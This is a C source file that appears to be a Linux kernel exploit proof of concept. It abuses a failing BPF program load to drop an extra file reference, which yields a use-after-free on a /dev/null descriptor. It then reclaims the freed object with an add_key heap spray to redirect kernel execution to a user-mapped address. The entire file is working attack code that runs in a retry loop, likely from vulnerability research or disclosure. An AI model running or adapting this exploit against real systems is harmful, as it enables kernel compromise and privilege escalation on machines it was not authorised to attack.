#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <err.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <linux/bpf.h>
#include "libexp.h"

#define USER_ADDR 0x20000
#define CRASH_IP 0xffffffffdeadbeef

int uaf_fd;
volatile int exit_flag = 0;
char payload[0x100-0x18];
int *stage;

int subproc_func(void *p) {
	prctl(PR_SET_PDEATHSIG, SIGKILL);
	sleep(100000);
}

void dec_refcount(void)
{
	struct bpf_insn insns[2] = {
		{
			.code = BPF_LD | BPF_IMM | BPF_DW,
			.src_reg = BPF_PSEUDO_MAP_FD,
			.imm = uaf_fd
		},
		{}
	};

	union bpf_attr attr = {
		.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
		.insn_cnt = 2,
		.insns = (__aligned_u64) insns,
		.license = (__aligned_u64)""
	};
	if (syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr)) != -1)
		errx(1, "expected BPF_PROG_LOAD to fail, but it didn't");
	if (errno != EINVAL)
		err(1, "expected BPF_PROG_LOAD to fail with -EINVAL, got different error");
}

void context_setup(void)
{
	// close all fd so that when the subprocess exits, only the uaf_fd will be closed
	for(int i=0; i<1000; i++) {
		close(i);
	}

	/* step 1: open writable UAF fd*/
	uaf_fd = open("/dev/null", O_WRONLY | O_CLOEXEC);
	if(uaf_fd < 0) err(1, "unable to open UAF fd");
	/* refcount is now 1 */

	/* step 2: create a subprocess that shares the fd table */
	char *child_stack = malloc(8000);
	int child = clone(subproc_func, child_stack + 8000, CLONE_FILES | CLONE_VM | SIGCHLD, NULL);
	if (child == -1)
		err(1, "clone");
	/* refcount is now 2 */
}

void spray_func(void)
{
	while(*stage == 0);
	puts("doing spray");
	add_key_spray_num(payload, sizeof(payload), 0x100);
	while(1);
}

void payload_setup(void)
{
	long *ptr = (long *)(payload+6);
	memset(payload, 0x4, sizeof(payload));
	ptr[2] = USER_ADDR;
	void *ret = mmap((void *)USER_ADDR, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0);
	if(ret != (void *)USER_ADDR) error_out("fail to mmap");
	ptr = (long *)(USER_ADDR + 0x8);
	*ptr = CRASH_IP;
	ptr = (long *)(USER_ADDR + 0x70);
	*ptr = CRASH_IP;

	stage = (int *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON | MAP_FIXED, -1, 0);
	if(stage < 0) error_out("mmap failed");
	*stage = 0;

	for(int i=0; i<cpu_num*3; i++) {
		if(!clean_fork()) {
			spray_func();
			while(1);
		}
	}
}

void trigger(void)
{
	/* step 3: use BPF to remove one reference */
	dec_refcount();

	/* step 4: kill the subprocess to remove one more reference */
	exit_flag = 1;
}

// perfrom exploit once
void exploit(void) {
	payload_setup();
	context_setup();
	trigger();
	*stage = 1;
	usleep(100000);// wait for the spray to finish

	//add_key_spray_num(payload, sizeof(payload), 0x400);
	//lseek(uaf_fd, 0, SEEK_SET);
	close(uaf_fd);
}

int main(void) {
	while(1) {
		usleep(10);
		if(!clean_fork()) {
			exploit();
			exit(0);
		}
		wait(NULL);
	}
}
